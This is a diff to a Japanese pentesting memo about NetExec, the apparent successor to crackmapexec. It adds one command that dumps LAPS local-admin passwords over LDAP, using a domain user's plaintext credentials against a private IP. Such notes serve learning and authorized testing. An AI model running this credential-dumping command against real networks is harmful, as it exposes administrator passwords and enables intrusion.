@@ -8,3 +8,7 @@ crackmapexecがあまり保守されなくなったぽいのでそれの後継�
 ドキュメントちゃんとしてていい。
 
 ## コマンド集
+1. LAPS読み取りの権限を持つドメインユーザの認証情報を使ってLAPSパスワードをダンプする。
+```
+nxc ldap 192.168.142.122 -u fmcsorley -p CrabSharkJellyfish192 -M laps
+```
